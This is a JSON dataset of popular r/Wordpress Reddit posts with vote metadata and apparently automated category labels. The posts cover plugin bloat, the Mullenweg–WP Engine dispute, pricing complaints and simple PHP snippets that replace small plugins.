[
  {
    "score": 2107,
    "title": "How most people use WordPress",
    "selftext": "Your site shouldn’t look like this power outlet.\n\nToo many and unnecessary plugin increases:\n\n• load time\n• attack surface\n• memory usage\n• debugging complexity\n• dependency risks\n\nBut most people won’t remove anything until their ‘one more plugin’ takes the whole site down. \n\nSometimes, you may be one short-circuit away from chaos.\n\nSo as long as the plugins you install come from diverse set of developers, there’s always a chance of one issue or another.\n\nReal WordPress devs understands this. You do not need a plugin for everything.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.99,
    "subreddit_type": "public",
    "ups": 2107,
    "downs": 0,
    "created_utc": 1763738630.0,
    "media": null,
    "is_video": false,
    "num_comments": 175,
    "num_reports": null,
    "over_18": false,
    "category": "listicle",
    "category_confidence": 0.68,
    "category_rationale": "Post contains a short list of plugin downsides.",
    "composite_score": 5.189126940447584
  },
  {
    "score": 820,
    "title": "Paid Memberships dev says Matt threatened to take over their plugin \"like we did to ACF\" when they removed it from dotorg.",
    "selftext": "&gt;Two days after we closed the Paid Memberships Pro listing in the .org repository, Matt sent a direct message to me (Jason) on the WordPress.org Slack Workspace threatening to “take over your listing and make it a community plugin like we did to ACF”.\n\nhttps://www.paidmembershipspro.com/leaving-wordpress-org/\n\nUPDATE:\n\"Verifying that we've viewed the Slack conversation that took place between @jason_coleman\n and @photomatt, and can confirm that Matt did threaten to take over Paid Memberships Pro. Story coming soon.\"\n [from The Repository](https://x.com/therepositorywp/status/1851038210547466386)\n\nUPDATE 2: \nFull story from The Repository: [\"Mullenweg threatens to take over Paid Memberships Pro\"](https://www.therepository.email/mullenweg-threatens-to-take-over-paid-memberships-pro)\n\nMeta note: Some users [[1]](https://www.reddit.com/r/Wordpress/comments/1geca45/paid_memberships_dev_says_matt_threatened_to_take/lu91idl/) [[2]](https://www.reddit.com/r/Wordpress/comments/1geca45/paid_memberships_dev_says_matt_threatened_to_take/lu9bk2i/) have observed downvote brigading on this post, along with other recent posts on this subreddit.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 820,
    "downs": 0,
    "created_utc": 1730147282.0,
    "media": null,
    "is_video": false,
    "num_comments": 182,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.55,
    "category_rationale": "News/rumor post about drama; mostly reporting with quotes.",
    "composite_score": 4.773068701984656
  },
  {
    "score": 644,
    "title": "Well, Matt just made WordPress even less business viable ",
    "selftext": "For those of us who have worked to get businesses using WordPress over the years...\n\n\"Mr. Mullenweg has no contracts, agreements, or obligation to provide WP Engine access \nto the network and resources of WordPress.org. WP Engine points to no terms, conditions, or \npermissions that entitle them to such access. Nevertheless, WP Engine, a private equity-backed \ncompany, made the unilateral decision, at its own risk, to build a multi-billion dollar business \naround Mr. Mullenweg’s website. In doing so, WP Engine gambled for the sake of profit that Mr. \nMullenweg would continue to maintain open access to his website for free. That was their choice.\"\n\nEssentially Matt has made it clear that we use WordPress at our own risk, and building on WordPress is a gamble that Matt won't screw over a business at any time.\n\nEdit - Source: https://storage.courtlistener.com/recap/gov.uscourts.cand.437474/gov.uscourts.cand.437474.33.0.pdf",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.92,
    "subreddit_type": "public",
    "ups": 644,
    "downs": 0,
    "created_utc": 1729697642.0,
    "media": null,
    "is_video": false,
    "num_comments": 438,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.72,
    "category_rationale": "Strong negative stance about WordPress business with emotional framing.",
    "composite_score": 4.820791974756329
  },
  {
    "score": 622,
    "title": "You asked how we're suffering as a result of Mullenweg's war with WPE? I just lost a 40 thousand dollar contract over it.",
    "selftext": "**EDIT 2**: Hi all, I've asked the mods to lock this post (so please don't go after them). I think it's done its job as far as sharing what I needed to share with the community, and I personally don't want to spend more time replying to everyone (especially the trolls here). If there are any other updates, I'll post them as an edit here. Hang in there.\n\n---\n\nA lot of people here seem to think that clients aren't aware of what's going on and therefore the impact will be minimal on developers. On a recent thread, the vast majority of commenters shrugged off the controversy as irrelevant to their day-to-day. And while that may be true for teeny tiny single-owner websites, some of us deal directly with large companies or white label through agencies, and let me tell you: their CMOs are well aware of what's happening.\n\nBackground: I'm a one-man outfit, who partners with a local visual designer to do the design work, or works white label to do the entire build for agencies.\n\n* I had a contract *signed and ready to go* for 2025, where the budget for dev was $40k, and now they've backed out to reconsider the CMS as a whole, as a result of Mullenweg's petty war with WPE.\n* I had another contract that just got signed with WPE (right before our Dictator for Life attacked WPE at WordCamp), the website for which I'm actively building right now. I'm also WPE affiliate. The client would have backed out of hosting if not for the extensive legal review they had to go through to set up the hosting in the first place, and they've only decided to stay on WPE for the short term. Potential impact on me is thousands of dollars in referral fees.\n* I have had three other key clients (large % of total revenue) I manage whose sites I built reach out to me for reassurance since WordCamp to ask if the platform is stable going forward. All of them are CTOs or CMOs. All I could say is that with honesty is *no one knows what the future holds*. I can't even reassure them on *the platform's stability*. All because of one terroristic founder who's bent on destroying what shred of good faith is left in his creation. I won't blame them for switching platforms on the next design refresh because of this. But that's a loss of *huge* potential revenue for me as a single-owner freelancer.\n\nSo yes, we *are* suffering. I'm considering picking up at least 3 other popular CMS's as offerings over my winter break to contend with this. This is huge and I'm glad the mods opened discussion so we can track of this on a post-by-post basis. This should be front page until WordPress is a stable platform again!\n\n**EDIT 1**: If you're here to troll, attack my credibility as a developer, or call my whole ordeal fake, I've called out the handful of you already in these threads, and the majority of you who aren't capable of having good faith discussions I've blocked. And let me remind you that block evasion is characterized on Reddit as harassment that should be reported. The vast majority of the community here, however, I've found is honest and wants to talk through this controversy that is facing us and, as I've learned in this thread, actively hurting *a lot* of us freelancers right now. Thank you for that honest discussion. To the rest of you: why don't you get back to work rather than wasting your breath victim blaming?",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.89,
    "subreddit_type": "public",
    "ups": 622,
    "downs": 0,
    "created_utc": 1728942899.0,
    "media": null,
    "is_video": false,
    "num_comments": 446,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.78,
    "category_rationale": "Emotional venting about personal impact of the conflict.",
    "composite_score": 4.7871418082251385
  },
  {
    "score": 588,
    "title": "Blocking China from our CDN improved CPU usage by 65%",
    "selftext": "I work as a Webmaster for a antique shop. I manage the site and eBay for our over 4000k products. For the past couple of weeks our server was reaching MAX CPU usage almost 24/7 and it was greatly effecting performance.\n\nAt first I thought it was something within the plugins I built or Installed. So I did the typical disable everything and enable one at a time to see CPU usage but that barely helped as no plugin was showing unusual behavior.\n\nThen last Thursday Google had a major outage that effected our CDN service with Hostinger. After that, I checked the analytics for our site and saw that IPs from China were consistently requesting more then all other countries COMBINED.\n\nAfter approval from the business owners (Who they stated they don't even ship anything to China anyways) I blocked Chinese IPs from making requests and that resolved all our performance issues. \n\nI'm not sure what they were doing with our site and why it bogged down performance so much but we now rest easy knowing that our site and all the admin tools we use on it are performing much better.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.99,
    "subreddit_type": "public",
    "ups": 588,
    "downs": 0,
    "created_utc": 1749999199.0,
    "media": null,
    "is_video": false,
    "num_comments": 102,
    "num_reports": null,
    "over_18": false,
    "category": "playbook",
    "category_confidence": 0.75,
    "category_rationale": "Describes a reproducible sequence to fix a performance issue.",
    "composite_score": 4.519033907139687
  },
  {
    "score": 551,
    "title": "I wrote a 280-page ebook on the technical architecture of WordPress, and I'm publishing it for free.",
    "selftext": "TL;DR: I was frustrated with the lack of high-quality resources for learning WordPress aimed at intermediate developers, so I took it upon myself to create one. You can read it for free [on my GitHub](https://github.com/wiktorjarosz/deep-dives) or as a series of articles [on my blog](https://wiktorjarosz.com/wordpress/introduction/).\n\n  \nHi,\n\nI've been creating WordPress websites for around 2 years now, but I never really understood how WordPress worked. I decided to change that a few months ago and really learn it. You can imagine how disappointed I was when I realized that most resources fall into one of three categories:\n\n* Tutorials aimed at beginners.\n* Technical documentation with no clear opinionated structure and flow for learning.\n* Marketing BS.\n\nWhen I try to learn something deeply, I find tutorials and mindless practice rather unproductive. Instead, I always see the biggest benefits when I go down the rabbit hole. I don't just want to know how something works or what function to use. I want to know why it works. I want to know how it ties to other parts of the system. I keep asking more and more questions until I don't have any more to ask. This is why I wrote this e-book.\n\nAs the title suggests, \"WordPress Deep Dive\" goes deep into all important parts of WordPress. It is not a tutorial, and you will probably not be able to get a website up and running after reading it. It's a 287-page system architecture case study, analyzing one of the largest web development frameworks in the world. Its goal is not to teach you how to write good WordPress code. It's to make you understand the very foundation your code runs on.\n\nSome of the most important topics covered include:\n\n* The request lifecycle\n* Hooks\n* The template hierarchy\n* Custom post types\n* Custom fields\n* Classic and Block editors\n* Blocks and block development\n* Themes\n* Plugins\n* Translations\n* Security (including validation, escaping, sanitization, nonces, SQL injections, XML-RPC, and more)\n* REST API\n\nAnd these are only 12 out of 32 top-level chapters. Some other important and/or niche chapters include taxonomies, shortcodes, post revisions, user accounts, AJAX, HTTP API, Rewrite API, Filesystem API, WP-Cron, caching, Multisite, WP-CLI, and more.\n\nAs I already implied, I started this project as a way to learn WordPress myself. Over time, it has evolved into what I think is a decent starting point for anyone who wants to become an expert WordPress developer. I don't consider myself to be one yet, but spending over 300 hours on this document has certainly brought me much closer to achieving this goal. I hope the e-book does the same for at least one other person.\n\nPDF: [https://github.com/wiktorjarosz/deep-dives](https://github.com/wiktorjarosz/deep-dives)  \nWeb-based version: [https://wiktorjarosz.com/wordpress/introduction/](https://wiktorjarosz.com/wordpress/introduction/)\n\nCheers,  \nWiktor\n\nPS: I'll be grateful for any feedback you guys have - both positive and negative.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.99,
    "subreddit_type": "public",
    "ups": 551,
    "downs": 0,
    "created_utc": 1762258125.0,
    "media": null,
    "is_video": false,
    "num_comments": 109,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.65,
    "category_rationale": "Explains the motivation for a deep resource and what it covers.",
    "composite_score": 4.505135420308311
  },
  {
    "score": 545,
    "title": "Update on r/Wordpress &amp; moderation going forward",
    "selftext": "Some of you may have already noticed, but if not, u/otto4242 has now given up his mod status here in the subreddit.\n\nThis change now means that the subreddit is no longer under the control of a user with ties to Matt or Automattic. Personally, I've not had any issues with u/otto4242 over the many years he's been moderating the subreddit, but I thank him for both his time &amp; expertise in here, as well as for relinquishing his position so that the new mod team can proceed with trying to tidy things up.\n\nAfter another discussion with the other mods, we've made a couple adjustments to things - all of which will hopefully allow for a friendlier atmosphere, less accusations of people being silenced and just a better experience in general.\n\nFirstly, the minimum karma requirement for new post submissions has been adjusted from it's former requirement of 1 or more, which was too low in my opinion. Users will now require 5 or more to be able to submit a post (a fairly standard requirement that I've experienced in other subreddits over the years).\n\nSecondly, any posts to do with WordPress itself, the companies connected to WordPress and ongoing legal issues or developments, are all now welcome. These posts will not be removed unless they violate the subreddit rules.\n\nPosts that are not related to WordPress in any way will continue to be removed, as necessary.\n\nGoing forward, if there are any issues with mods, or issues in general, please reach out to the mod team first so that we can try to fix any problems whilst keeping the subreddit free from posts that aren't anything to do with WordPress.\n\nThanks,\n\nMatt (yes, I know, bad time to be called Matt...)\n\nEdit: words\n\nUpdate: 26th October - After a trial of the new min karma requirements for new posts, this has been reversed (from 5 to 1) due to most removed posts (from users with less than 5 karma) being legitimate. Very few were spam, and it is much less work to remove the spam posts than it is to continuously approve legit posts.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 545,
    "downs": 0,
    "created_utc": 1729513941.0,
    "media": null,
    "is_video": false,
    "num_comments": 112,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.6,
    "category_rationale": "Administrative moderation update; meta discussion.",
    "composite_score": 4.491231864446447
  },
  {
    "score": 508,
    "title": "I gave Matt the domain Wordpress.com for Free - he then sued me",
    "selftext": "I have read some disturbing allegations going on with WordPress.  I do not know about the truth, but I want to say something to the Wordpress community:\n\n**~~I hated Matt more than ANYONE in the world.  I am asking you to give him a chance.~~**\n\n**EDIT:  After all the replies, let me change my intent to this:**  \n\n**Please do not let ANYONE screw WordPress.  Matt may have done some bad things, but that does NOT mean the other parties in the lawsuit are on your side.**\n\nI am the founder of OpenDomain - a non-profit project I run where we contribute domains for Free to promote open source or help other great organizations.  Some domains we have contributed\n\n* [Drupal.Com](http://Drupal.Com) to Dries Buytaert\n* [Schema.Org](http://Schema.Org) to Google\n* [FosDem.com](http://FosDem.com) to the Free and Open source Software Developers' European Meeting\n* [OsCon.com](http://OsCon.com) to Tim O'Reilly / Open Source Convention\n* [Xmpp.Org](http://Xmpp.Org) to Jabber\n* [Ecmascript.org](http://Ecmascript.org) to Brendan Eich /  Mozilla\n* [MrBeast.Org](http://MrBeast.Org) to Jimmy Donaldson / Beast Philanthropy\n* [WebPlatform.Com](http://WebPlatform.Com) to the W3c\n   * Tim Berners-Lee thanked ME!  [https://imgur.com/gallery/tim-berners-lee-sGDFrkG](https://imgur.com/gallery/tim-berners-lee-sGDFrkG)\n\nI am a developer that uses Open Source software - this is my way of contributing.  Some people write code to directly put into open source software - while I write code in my day job, get paid, then use that money to buy domains from squatters to give it to open source and charities.\n\n20 years ago, I gave the domain [Wordpress.com](http://Wordpress.com) to Matt Mullenweg.  Then he sued me and I lost everything. (Clarification: I did transfer the domain [WordPress.com](http://WordPress.com) to Matt for Free, but it was not part of OpenDomain.  The project was new and I did not have everything setup at the time.)\n\nWhen Matt sued me, I had severe emotional distress.  I lost my my job. My life savings. My house. I almost lost my family and my life.   I hated Matt more than I thought possible   I went to therapy for years. My therapist was absolutely amazing.  She helped me get past the hate and I learned some important wisdom:\n\n* She asked me if I wanted to get lawyers to try to take the domain back.  I answered that I did not - mostly because I did now want the stress of another lawsuit, but also because I still wanted to support WordPress and Matt was the person.  Kind of like I found his wallet, and I was just returning it to him.\n* I sometimes could not sleep from the hate I felt.  I thought about bad things every day.  What helped me get past the hate was when my therapist asked me if Matt thought about me.  When I realized that Matt did not care about me or my family, that he probably did not even know who I was, then I realized that the hate was a poison that only hurt me.\n* Here is the biggest kicker:   Matt may not be evil in his own mind.  He may sued me out was just something he was doing to as part of business.  Or one of his investors asked him to file the lawsuit.\n\nMy goal for writing this post to hope that WordPress community does not get hurt. I am sure that Matt has made some mistakes. But maybe he was just protecting Wordpress and just over-reacted? Also think about the companies against Matt - what have they contributed to Wordpress?  What can they gain by vilifying Matt? Maybe someone wants him out so they can gain control?\n\nPlease note that I am I am not justifying anything.  I do not know what really is going on.  But HATE is the path to the dark side.\n\nMy goal for OpenDomain is to promote open source, and in that Matt has done an amazing job.\n\nWordPress is fantastic software.  I would like to thank EVERYONE that helped make it.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.82,
    "subreddit_type": "public",
    "ups": 508,
    "downs": 0,
    "created_utc": 1739246645.0,
    "media": null,
    "is_video": false,
    "num_comments": 343,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.7,
    "category_rationale": "Personal post with strong emotional expression about Matt.",
    "composite_score": 4.589997003622524
  },
  {
    "score": 475,
    "title": "I turned ChatGPT into my Wordpress expert",
    "selftext": "I fed the entire Wordpress documentation, Wordpress educational articles, Wordpress integrations and Wordpress help content to a ChatGPT-powered assistant. You can ask it questions like:\n- Wordpress theme troubleshooting\n- SEO best practices\n- marketing tips\n- best plugins\n\nI made all this public [here](https://www.lingoblocks.com/playground/gOwokDW2uFpJ2s1wtOzO), so anyone can chat with the assistant for free. No account needed.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 475,
    "downs": 0,
    "created_utc": 1693924378.0,
    "media": null,
    "is_video": false,
    "num_comments": 183,
    "num_reports": null,
    "over_18": false,
    "category": "listicle",
    "category_confidence": 0.62,
    "category_rationale": "Bullet list of capabilities of an AI WordPress expert.",
    "composite_score": 4.545015864225261
  },
  {
    "score": 444,
    "title": "Founder of Ruby on Rails criticizes Automattic, says they are trying to have their cake and eat it too.",
    "selftext": "The founder of the popular open-source platform Ruby on Rails slams Automattic in a post titled, \"Automattic is doing open source dirty.\"\n\n\"I give you [a gift of code](https://world.hey.com/dhh/the-open-source-gift-exchange-2171e0f0), you accept the terms of the license. There cannot be a second set of shadow obligations that might suddenly apply, if you strike it rich using the software. Then the license is meaningless, the clarity all muddled, and certainty lost.\"\n\n\\[...\\]\n\n\"But I suspect Automattic wants to have their cake and eat it too. They went to retain WordPress' shine of open source, but also be able to extract their pound of flesh from any competitor that might appear, whenever they see fit. Screw that.\"\n\nYou can [read the entire article here](https://world.hey.com/dhh/automattic-is-doing-open-source-dirty-b95cf128).",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 444,
    "downs": 0,
    "created_utc": 1728429608.0,
    "media": null,
    "is_video": false,
    "num_comments": 100,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.58,
    "category_rationale": "Covers external critique; mainly reporting.",
    "composite_score": 4.378020697872253
  },
  {
    "score": 411,
    "title": "Open letter to Matt Mullenweg",
    "selftext": "Dear Matt,\n\nYour decision to forcibly fork ACF and rebrand it as \"Secure Custom Fields\" has raised more than a few eyebrows in the WordPress community, and rightly so. What you frame as a noble fight for security reeks of arrogance and a disturbing overreach of power.\n\nThe move to wrest control of ACF from WP Engine and strip away its commercial elements not only disrupts ongoing development but sends a clear message: if a company doesn’t conform to your vision, you’re willing to take drastic measures to force them out. The WordPress community thrives on openness, cooperation, and trust—values that your hostile maneuver has trampled on. Instead of engaging in constructive dialogue, you opted for unilateral action, dragging everyone into your personal crusade against WP Engine.\n\nThe way you’ve leveraged WordPress.org as a weapon against WP Engine sets a dangerous precedent. This isn’t just about security concerns, as you claim. It's about consolidating control under the pretense of altruism, all while fostering deeper conflict within the open-source ecosystem. Your \"mad king\" behavior, as some in the open-source community have dubbed it, risks tearing apart the very foundation that WordPress is built on.\n\nTo many, your actions seem less like stewardship and more like the tantrum of someone unwilling to share the sandbox. The fallout has already begun, with WordCamps distancing themselves from WP Engine, confusing community events with ill-communicated sponsorship bans, and forcing developers to navigate the chaos you’ve unleashed. Was this power grab really worth all the damage?\n\nYou’ve achieved incredible things with WordPress, but don’t let that legacy be overshadowed by reckless power plays. Restore trust by rethinking how you handle disputes—before the community you helped build becomes a battleground of commercial skirmishes and mistrust.\n\nTLDR \n\nMatt, stop being a dick.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.88,
    "subreddit_type": "public",
    "ups": 411,
    "downs": 0,
    "created_utc": 1729332860.0,
    "media": null,
    "is_video": false,
    "num_comments": 238,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.78,
    "category_rationale": "Open letter with strong emotional critique of Matt Mullenweg's actions.",
    "composite_score": 4.464096166507203
  },
  {
    "score": 408,
    "title": "WP Rocket dropping their unlimited license in favor of price gouging",
    "selftext": "WP Rocket has been a great plugin for us. It works well, and it helps us achieve high Pagespeed scores with very little intervention after our initial programming is done. And we've used them for a long time, too. I think we've had the \"Unlimited License\" for 9 or 10 years. \n\nBut that doesn't matter, apparently. We aren't lining their pockets enough and they are just straight-up cancelling our plan and trying to force us on to something costing more than 3X our current price. \n\nWhat a joke. In case you didn't notice, Agatha -- there are probably a dozen or more caching plugins just as good as yours that we can switch our customers over to. If you hadn't been so greedy, I might have just let it slide and continued paying without even considering the alternatives again.  \n  \nAnyway, the damage is done. Good riddance, WP Rocket.",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 408,
    "downs": 0,
    "created_utc": 1754181962.0,
    "media": null,
    "is_video": false,
    "num_comments": 175,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.72,
    "category_rationale": "Strong emotional complaint about price increase; no steps.",
    "composite_score": 4.461979641914417
  },
  {
    "score": 401,
    "title": "Secure Custom Fields",
    "selftext": "Oh boy it’s happening, Matt and the team at WordPress are forking Advance Custom Fields:\n\nhttps://wordpress.org/news/2024/10/secure-custom-fields/\n\nWhat do you folks think? A good or a bad thing?\n\nI’m worried that this in the long run will stop people from creating plugins on top of WordPress as even though they state “we do not anticipate this happening for other plugins”, it can still scare away people that one they their livelihood might be taken away.\n",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.98,
    "subreddit_type": "public",
    "ups": 401,
    "downs": 0,
    "created_utc": 1728758190.0,
    "media": null,
    "is_video": false,
    "num_comments": 538,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.54,
    "category_rationale": "Primarily a question about implications with little substantive content.",
    "composite_score": 4.70502043567784
  },
  {
    "score": 402,
    "title": "Headless WordPress + Next.js = 💯",
    "selftext": "This is Happiness ✅\nVery Few People Can Relate and Understand.\n\nHeadless WordPress + Next.js = 💯\n\n\nEdit: \nMany Peoples are asking about the tech stack &amp; cost of this application. \n\nDisclaimer: This setup is Only For scalable Production grade application. For simple Blog/news website, this kind of setup is not needed.\n\nBackend \n---------------------\nCMS: WordPress + Woocommerce + ACF + RestAPI + 50+ Custom php functions\n\nHosting : \nCloudways (2GB Premium Digital Ocean) \n- $28/month\n- Varnish Cache Enabled\n- Cloudways breeze plugin +  Reddis cache pro enabled\n\nFrontend\n--------------------------\nHosting: Cloudways same server \n- Frontend: Next.js\n- Cloudflare Enterprise embedded in cloudways ($5/month)\n- Varnish Cache\n\n-------------------------------------------------------------\n\nTotal Cost: $33/month \n\n- No premium caching Plugin\n- No Page Builder\n- Fully Customisable\n- Smooth and Fluid User Experience \n\n\nWordpress give you the power and confidence of the content of your application.\nWhile Next.js Provides the best frontend user experience.\n\nWhen Both Combined WordPress Next.js, your imagination is the limit .\nYou can create any type of of content based application.\n\n\nYou are not dependent on a specific page builder, or a specific plugin for anymore...\n\n\nIf You have any queries about pagespeed speed optimisation, ask in the comment or you can always DM me !\n\nI will be Happy to help you.\n",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.93,
    "subreddit_type": "public",
    "ups": 402,
    "downs": 0,
    "created_utc": 1757270094.0,
    "media": null,
    "is_video": false,
    "num_comments": 256,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.66,
    "category_rationale": "Describes a tech setup and argues its value; informative explanation.",
    "composite_score": 4.507771607806757
  },
  {
    "score": 389,
    "title": "Today I learned that WordPress sends your site URL regularly to Matt's servers (wp.org). That includes localhost sites that have never been exposed to the internet.",
    "selftext": "You know that super-secret site you're working on right now? The one you've set up on localhost with a URL like:\n\nhttp://matt-might-be-spying-on-me.localhost  ?\n\nGuess what? WordPress is designed to share that URL to Matt's *personal website* (wordpress.org) with every install, update check, news widget fetch, and plugin update request. \n\nThink about it. It's possible for Matt's to know:\n\n(1) What you are working on. \n(2) What your home/office IP address is.\n\nAnd, if you ever login to WordPress.org from that IP address he can connect all the above to **your identity** (3).\n\nSo much for Automattic's \"privacy\" focus.\n\nSource: https://x.com/alexsirota/status/1854589635793764721\n\nDisclaimer: We don't know if Matt is logging this info but it's a fact that he does *have access to it* (this *could* be the basis for how the \"WP Engine Tracker\" database is built).",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.91,
    "subreddit_type": "public",
    "ups": 389,
    "downs": 0,
    "created_utc": 1731009578.0,
    "media": null,
    "is_video": false,
    "num_comments": 278,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.6,
    "category_rationale": "Presents a claim about privacy risks and explains potential consequences.",
    "composite_score": 4.496366708663298
  },
  {
    "score": 358,
    "title": "Yes, Gutenberg is a failure. No, it isn’t complicated",
    "selftext": "I am so confused to see some people trying to argue that Gutenberg was not a failure.\n\nToday, 10 years after Gutenberg was released, the Plugin “classic editor” remains amongst the VERY TOP most popular plugins.\n\nIt boasts nearly 10M active installs and that is on par with the #1 plugin (YOAST) that has 11M. \n\nIf you release a product, and it is so deeply hated that 10 YEARS LATER, the most popular widget is a tool that dismantles said product ….. then Yes: that product was a massive failure!",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.8,
    "subreddit_type": "public",
    "ups": 358,
    "downs": 0,
    "created_utc": 1750962140.0,
    "media": null,
    "is_video": false,
    "num_comments": 430,
    "num_reports": null,
    "over_18": false,
    "category": "value-add",
    "category_confidence": 0.62,
    "category_rationale": "Argues Gutenberg's failure with justification rather than steps.",
    "composite_score": 4.472333083658685
  },
  {
    "score": 352,
    "title": "Why did the Wordpress layoffs not include the CEO",
    "selftext": "Everyone now knows the following two things are true:\n\n1) 2024 was the toughest year for Wordpress since inception.\n2.) It was Matt, and Matt himself, that initiated the fights / lawsuits, against the pleas of the entire community that caused the pain.\n\nMatt has stated in public the lawsuits may eventually force Wordpress to slow down development or even close, so why won’t he resign for the good of Wordpress, using his own logic and stated love for Wordpress?",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.92,
    "subreddit_type": "public",
    "ups": 352,
    "downs": 0,
    "created_utc": 1743692432.0,
    "media": null,
    "is_video": false,
    "num_comments": 84,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.7,
    "category_rationale": "Explicit moral/political critique and call for resignation.",
    "composite_score": 4.202484168244969
  },
  {
    "score": 345,
    "title": "Stop installing plugins for these 5 things (Code Snippets included)",
    "selftext": "I audit a lot of WordPress sites, and the most common performance killer I see isn't \"Heavy Themes\", it's \"Plugin Creep.\" Too many people install a 2MB plugin just to do a 5-line job.\n\nHere are 5 \"Micro-Plugins\" I delete immediately on client sites, and the code snippets I replace them with.\n\n**(Note: Put these in your child theme's** `functions.php` **or a code snippets plugin. Don't edit parent themes directly.)**\n\n**1. Google Analytics / GTM** You don't need a plugin to paste a tracking ID. It adds unnecessary PHP overhead.\n\n    add_action('wp_head', 'add_google_analytics');\n    function add_google_analytics() { ?&gt;\n        &lt;?php }\n\n**2. \\*\\[Edited\\] SVG Support** Don't install a plugin just to upload a logo.   \n  \nThanks to u/botford80 for this suggestion.\n\nThis code restricts uploads to Admins or specific users, but it does not **sanitize** the files (like a plugin would). Only upload SVGs from 100% trusted sources, as a malicious SVG can still compromise the site.  \n  \nThis only allows admins to upload svgs:\n\n    add_filter( 'upload_mimes', 'enable_svg_for_admins' );\n    function enable_svg_for_admins( $mimes ) {\n    \n        if ( current_user_can( 'manage_options' ) ) {\n            $mimes['svg'] = 'image/svg+xml';\n        }\n    \n        return $mimes;\n    }\n\nThis only allows specific user ids to uploads svgs:\n\n    add_filter( 'upload_mimes', 'enable_svg_for_specific_users' );\n    function enable_svg_for_specific_users( $mimes ) {\n    \n        $allowed_user_ids = [ 1, 2, 3 ]; \n    \n        if ( is_user_logged_in() &amp;&amp; in_array( get_current_user_id(), $allowed_user_ids, true ) ) {\n            $mimes['svg'] = 'image/svg+xml';\n        }\n    \n        return $mimes;\n    }\n\n**3. Disabling XML-RPC (Security)** This is a common attack vector. You don't need Wordfence just to turn this specific door off.\n\n    add_filter( 'xmlrpc_enabled', '__return_false' );\n\n**4. Hide Admin Bar for Non-Admins** Great for membership sites or subscriber logins.\n\n    if ( ! current_user_can( 'manage_options' ) ) {\n        add_filter('show_admin_bar', '__return_false');\n    }\n\n**5. Disable Gutenberg (If you are a Classic Editor/Page Builder diehard)** If you never use the block editor, stop loading its CSS on the front end.\n\n    add_filter('use_block_editor_for_post', '__return_false', 10);\n    // Prevent block styles from loading on frontend\n    add_action( 'wp_enqueue_scripts', function() {\n        wp_dequeue_style( 'wp-block-library' );\n        wp_dequeue_style( 'wp-block-library-theme' );\n    }, 100 );\n\n**The Golden Rule:** If the solution requires a UI (like a Form Builder), use a plugin. If the solution is invisible logic (like the list above), use code.\n\nWhat other \"Micro-Plugins\" do you guys replace with snippets?",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.89,
    "subreddit_type": "public",
    "ups": 345,
    "downs": 0,
    "created_utc": 1765699695.0,
    "media": null,
    "is_video": false,
    "num_comments": 96,
    "num_reports": null,
    "over_18": false,
    "category": "listicle",
    "category_confidence": 0.95,
    "category_rationale": "Listed five actionable micro-plugins and how to replace them.",
    "composite_score": 4.199961965925899
  },
  {
    "score": 339,
    "title": "Friendly reminder: Please upvote people who go out of their way to resolve your WordPress issues",
    "selftext": "Today I spent a decent chunk of time helping two different people troubleshoot their WordPress problems. Both were grateful, said the advice helped, and got their issues resolved — but neither upvoted any of my responses.\n\nIt’s not a huge deal, but it’s been happening more often lately, and for some reason, it’s just sticking with me today. Maybe I’m overthinking it, but I figured I’d share. Is this just normal Reddit behaviour, or am I being overly sensitive?",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.94,
    "subreddit_type": "public",
    "ups": 339,
    "downs": 0,
    "created_utc": 1760100671.0,
    "media": null,
    "is_video": false,
    "num_comments": 41,
    "num_reports": null,
    "over_18": false,
    "category": "other",
    "category_confidence": 0.52,
    "category_rationale": "Short upvote reminder with little substantive content.",
    "composite_score": 4.048103562241205
  },
  {
    "score": 329,
    "title": "Clients with $300 budgets asking for a $5M user experience. Devs, how do you respond?",
    "selftext": "You ever meet those clients who come with a $50 budget but want a site that looks like Apple, loads faster than Google, has animations smoother than Pixar, and ranks #1 on SEO by next week?\n\n And just to sweeten the madness, they throw in, “If you do this, I’ll bring more clients.”\n\n Bro, I’m not a magician. I’ve got nothing against helping small businesses, but unrealistic expectations with near-zero budgets are pure comedy. \n\nWhat’s the wildest thing a low paying client has ever asked you to do?",
    "subreddit": "Wordpress",
    "upvote_ratio": 0.97,
    "subreddit_type": "public",
    "ups": 329,
    "downs": 0,
    "created_utc": 1750021401.0,
    "media": null,
    "is_video": false,
    "num_comments": 169,
    "num_reports": null,
    "over_18": false,
    "category": "rant",
    "category_confidence": 0.65,
    "category_rationale": "Vent about unrealistic client budgets and rant-like tone.",
